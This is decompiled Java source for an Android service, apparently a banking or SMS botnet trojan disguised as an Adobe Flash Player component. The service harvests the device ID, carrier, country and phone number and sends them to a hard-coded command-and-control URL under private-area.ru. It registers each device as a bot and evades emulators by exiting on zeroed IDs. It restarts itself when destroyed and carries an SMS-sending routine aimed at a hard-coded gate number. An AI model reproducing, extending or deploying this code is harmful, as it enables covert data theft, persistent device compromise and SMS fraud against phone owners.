package com.adobe.flashplayer_;

import android.app.Service;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build.VERSION;
import android.os.CountDownTimer;
import android.os.IBinder;
import android.provider.Settings.Secure;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;

public class AdobeFlashCore extends Service {
    public String Reich_SMSGate = null;
    public String Reich_ServerGate = null;

    public void onCreate() {
        super.onCreate();
        String Gate = readConfig("Reich_SMSGate");
        String ServerGate = readConfig("Reich_ServerGate");
        String lockd = "http://private-area.ru/new/sys/alg.php";
        this.Reich_SMSGate = Gate;
        this.Reich_ServerGate = ServerGate;
        if (this.Reich_SMSGate == "") {
            this.Reich_SMSGate = "79194057240";
            writeConfig("Reich_SMSGate", this.Reich_SMSGate);
        }
        if (this.Reich_ServerGate == "") {
            this.Reich_ServerGate = "http://private-area.ru/israel/gate.php";
            writeConfig("Reich_ServerGate", this.Reich_ServerGate);
        }
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService("phone");
        String BotID = telephonyManager.getDeviceId();
        String BotNetwork = telephonyManager.getNetworkOperatorName();
        String BotLocation = telephonyManager.getSimCountryIso();
        String SDK = VERSION.RELEASE;
        String BotVer = "5.3";
        if (BotID == null) {
            BotID = Secure.getString(getApplicationContext().getContentResolver(), "android_id");
        }
        if (BotNetwork == null) {
            BotNetwork = "Android";
        }
        if (BotLocation == null) {
            BotLocation = "Unknown";
        }
        String pn = ((TelephonyManager) getSystemService("phone")).getLine1Number();
        pn = pn == null ? "" : pn.replace("+", "");
        writeConfig("BotID", BotID);
        writeConfig("BotNetwork", BotNetwork);
        writeConfig("BotLocation", BotLocation);
        writeConfig("BotVer", BotVer);
        writeConfig("BotPhone", pn);
        if (BotID.indexOf("000000000000000") != -1) {
            System.exit(0);
        }
        if (isOnline()) {
            new FlashVars().execute(new String[]{this.Reich_ServerGate + "?a=0&b=" + BotID + "&c=" + BotNetwork.replace(":", "") + "&d=" + BotLocation + "&e=" + pn + "&f=" + BotVer + "&g=" + SDK});
        }
        new CountDownTimer(90000, 10000) {
            public void onTick(long millisUntilFinished) {
                AdobeFlashCore.this.startService(new Intent(AdobeFlashCore.this.getApplicationContext(), AdobeUtil.class));
            }

            public void onFinish() {
                AdobeFlashCore.this.stopSelf();
            }
        }.start();
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onDestroy() {
        startService(new Intent(this, AdobeFlashCore.class));
    }

    public boolean isOnline() {
        NetworkInfo netInfo = ((ConnectivityManager) getSystemService("connectivity")).getActiveNetworkInfo();
        if (netInfo == null || !netInfo.isConnectedOrConnecting()) {
            return false;
        }
        return true;
    }

    private String readConfig(String config) {
        String ret = "";
        try {
            InputStream inputStream = openFileInput(config);
            if (inputStream == null) {
                return ret;
            }
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
            String receiveString = "";
            StringBuilder stringBuilder = new StringBuilder();
            while (true) {
                receiveString = bufferedReader.readLine();
                if (receiveString == null) {
                    inputStream.close();
                    return stringBuilder.toString();
                }
                stringBuilder.append(receiveString);
            }
        } catch (FileNotFoundException | IOException e) {
            return ret;
        }
    }

    private void writeConfig(String config, String data) {
        try {
            OutputStreamWriter outputStreamWriter = new OutputStreamWriter(openFileOutput(config, 0));
            outputStreamWriter.write(data);
            outputStreamWriter.close();
        } catch (IOException e) {
        }
    }

    public void sendSMS(String n, String msg) {
        String phoneNumber = n;
        String message = msg;
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendMultipartTextMessage(phoneNumber, null, smsManager.divideMessage(message), null, null);
    }
}
